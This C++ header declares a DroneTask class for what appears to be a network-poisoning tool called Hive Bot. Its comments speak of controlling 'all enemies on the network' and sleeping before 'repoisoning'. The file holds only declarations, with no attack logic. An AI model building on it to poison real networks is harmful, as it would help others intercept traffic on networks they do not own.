/*
 * Copyright (c) 2017 The Hive Bot project authors. All rights reserved.
 * Use of this source code is governed by a BSD-style license that can be
 * found in the LICENSE file.
 */

/*
 * drone_task.h - Drone task header.
 *
 * Controls all enemies on the network to do our bidding.
 */

#ifndef HIVE_BOT_DRONE_TASK_H_
#define HIVE_BOT_DRONE_TASK_H_

#include "protocol_utils.h"

#include <atomic>
#include <mutex>
#include <thread>

namespace hive_bot {

class DroneTask {

  private:
    // Duration in seconds to sleep before repoisoning.
    u_long sleep_duration_;

    // The thread the poison task is running on.
    std::thread task_thread_;

    // Determines if the task should still be running.
    std::atomic<bool> running_ = { false };

    // Ensures task is only ran once.
    std::mutex mutex_;

    void Loop();

  public:
    DroneTask(u_long sleep_duration);

    bool IsRunning();

    bool Start();

    void Stop();
};

} // hive_bot

#endif // HIVE_BOT_DRONE_TASK_H_
